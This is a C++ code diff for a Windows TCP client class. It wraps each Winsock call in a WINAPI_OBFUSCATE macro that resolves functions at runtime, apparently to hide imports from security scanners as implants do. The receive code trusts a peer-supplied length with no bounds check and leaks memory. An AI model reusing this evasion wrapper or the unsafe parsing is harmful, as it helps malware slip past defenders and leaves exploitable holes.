@@ -8,58 +8,60 @@ TCPClient::TCPClient(const char* ip_address, const int port)
 {}
 
 TCPClient::~TCPClient() {
-    closesocket(m_sockfd);
-    WSACleanup();
+    WINAPI_OBFUSCATE(close_socket_type, "closesocket", "ws2_32")(m_sockfd);
+    WINAPI_OBFUSCATE(wsa_cleanup_type, "WSACleanup", "ws2_32")();
 }
 
 void TCPClient::reconnect() {
+    wsa_startup_type wsa_startup = WINAPI_OBFUSCATE(wsa_startup_type, "WSAStartup", "ws2_32");
+    wsa_cleanup_type wsa_cleanup = WINAPI_OBFUSCATE(wsa_cleanup_type, "WSACleanup", "ws2_32");
     sockaddr_in server_addr;
     WSADATA wsData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) {
+    if (wsa_startup(MAKEWORD(2, 2), &wsData) != 0) {
         return;
     }
-    m_sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    m_sockfd = WINAPI_OBFUSCATE(socket_type, "socket", "ws2_32")(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (m_sockfd == INVALID_SOCKET) {
-        WSACleanup();
+        wsa_cleanup();
         return;
     }
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(m_port);
-    inet_pton(AF_INET, m_ip_address, &server_addr.sin_addr);
+    server_addr.sin_port = WINAPI_OBFUSCATE(htons_type, "htons", "ws2_32")(m_port);
+    WINAPI_OBFUSCATE(inet_pton_type, "inet_pton", "ws2_32")(AF_INET, m_ip_address, &server_addr.sin_addr);
 
-    if (connect(m_sockfd, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
-        closesocket(m_sockfd);
-        WSACleanup();
+    if (WINAPI_OBFUSCATE(connect_type, "connect", "ws2_32")(m_sockfd, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
+        WINAPI_OBFUSCATE(close_socket_type, "closesocket", "ws2_32")(m_sockfd);
+        wsa_cleanup();
     }
 }
 
 void TCPClient::send_data(const char* data) {
-    int bytes_sent = send(m_sockfd, data, static_cast<int>(strlen(data)), 0);
+    int bytes_sent = WINAPI_OBFUSCATE(send_type, "send", "ws2_32")(m_sockfd, data, static_cast<int>(strlen(data)), 0);
     if (bytes_sent == SOCKET_ERROR) {
-        closesocket(m_sockfd);
-        WSACleanup();
+        WINAPI_OBFUSCATE(close_socket_type, "closesocket", "ws2_32")(m_sockfd);
+        WINAPI_OBFUSCATE(wsa_cleanup_type, "WSACleanup", "ws2_32")();
     }
 }
 
 const std::shared_ptr<char*> TCPClient::receive() {
     char size[4];
-    int bytes_received = recv(m_sockfd, size, 4, 0);
+    int bytes_received = WINAPI_OBFUSCATE(recv_type, "recv", "ws2_32")(m_sockfd, size, 4, 0);
     if (bytes_received == SOCKET_ERROR) {
-        closesocket(m_sockfd);
-        WSACleanup();
+        WINAPI_OBFUSCATE(close_socket_type, "closesocket", "ws2_32")(m_sockfd);
+        WINAPI_OBFUSCATE(wsa_cleanup_type, "WSACleanup", "ws2_32")();
     }
     auto data = std::make_shared<char*>(new char[*reinterpret_cast<uint32_t*>(size)]);
-    recv(m_sockfd, *data, *reinterpret_cast<uint32_t*>(size), 0);
+    WINAPI_OBFUSCATE(recv_type, "recv", "ws2_32")(m_sockfd, *data, *reinterpret_cast<uint32_t*>(size), 0);
     return data;
 }
 
 const std::shared_ptr<char*> TCPClient::receive(int size) {
     auto data = std::make_shared<char*>(new char[size]);
-    recv(m_sockfd, *data, size, 0);
+    WINAPI_OBFUSCATE(recv_type, "recv", "ws2_32")(m_sockfd, *data, size, 0);
     return data;
 }
 
 void TCPClient::disconnect() {
-    closesocket(m_sockfd);
-    WSACleanup();
+    WINAPI_OBFUSCATE(close_socket_type, "closesocket", "ws2_32")(m_sockfd);
+    WINAPI_OBFUSCATE(wsa_cleanup_type, "WSACleanup", "ws2_32")();
 }
